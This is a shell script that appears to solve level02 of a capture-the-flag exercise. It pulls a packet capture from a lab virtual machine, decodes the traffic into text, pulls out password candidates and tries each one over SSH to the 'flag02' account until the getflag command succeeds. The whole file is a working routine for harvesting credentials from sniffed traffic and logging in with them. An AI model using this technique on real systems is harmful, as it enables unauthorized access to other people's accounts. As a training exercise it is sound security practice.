#!/bin/sh -eu

PREVIOUS_FLAG=../../level01/flag
ADDRESS=192.168.122.214
PORT=4242
PCAP=level02.pcap
FLAG=../flag

# Copy the 'level02.pcap' file from the virtual machine to the host + set its permissions
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null scp -P ${PORT} level02@${ADDRESS}:${PCAP} .
chmod 600 ${PCAP}

# Extract the raw data from the packets of the 'level02.pcap' file
RAW_PACKET_DATA=$( tshark -r ${PCAP} -T fields -e 'data' | tr -d '\n' )

# Convert the raw data from hexadecimal to ASCII
PACKET_DATA=''
for HEXADECIMAL_BYTE in  $( echo ${RAW_PACKET_DATA} | sed 's/../0x&\n/g' ); do
	DECIMAL_BYTE=$( printf '%u' ${HEXADECIMAL_BYTE} )

	if [ ${DECIMAL_BYTE} -gt 32 ] && [ ${DECIMAL_BYTE} -lt 127 ]; then
		# Printable ASCII character
		PACKET_DATA=${PACKET_DATA}$( echo ${HEXADECIMAL_BYTE} | xxd -p -r )
	elif [ ${DECIMAL_BYTE} -eq 127 ]; then
		# DELETE character
		PACKET_DATA=${PACKET_DATA%?}
	else
		# Non-printable byte
		PACKET_DATA=${PACKET_DATA}.
	fi
done

# Extract the password field(s) from the packet data
POTENTIAL_PASSWORDS=$(
	echo ${PACKET_DATA} | grep -Eo 'Password:\.*[^.]+' | sed 's/Password:\.*//g'
)

for POTENTIAL_PASSWORD in ${POTENTIAL_PASSWORDS}; do
	# Try to connect to the virtual machine and run the `getflag` command as the 'flag02' user
	if
		sshpass -p ${POTENTIAL_PASSWORD} >${FLAG} 2>/dev/null \
			ssh -p ${PORT} flag02@${ADDRESS} "getflag | grep -oE '[^ ]+$'"
	then
		# Found the correct password and saved the flag
		rm ${PCAP}
		exit 0
	fi
done

# Did not find the correct password, and thus could not get the flag
rm ${FLAG} ${PCAP}
echo >&2 'error: none of the potential passwords is the correct one'
exit 1
